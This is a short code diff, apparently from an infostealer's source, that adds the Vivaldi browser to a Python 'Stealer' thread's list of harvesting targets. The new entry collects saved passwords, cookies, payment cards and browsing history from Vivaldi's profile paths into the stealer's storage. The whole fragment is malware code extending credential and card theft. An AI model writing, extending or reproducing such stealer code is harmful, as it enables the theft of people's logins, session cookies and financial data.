@@ -78,6 +78,15 @@ class Stealer(Thread):
                 )
             },
             {
+                "object": Chromium(
+                    "Vivaldi",
+                    self.config.StoragePath,
+                    *self.config.VivaldiPaths,
+                    (self.passwords, self.cookies, self.cards, self.history),
+                    self.errors
+                )
+            },
+            {
                 "object": System(
                     self.config.StoragePath,
                     "System",
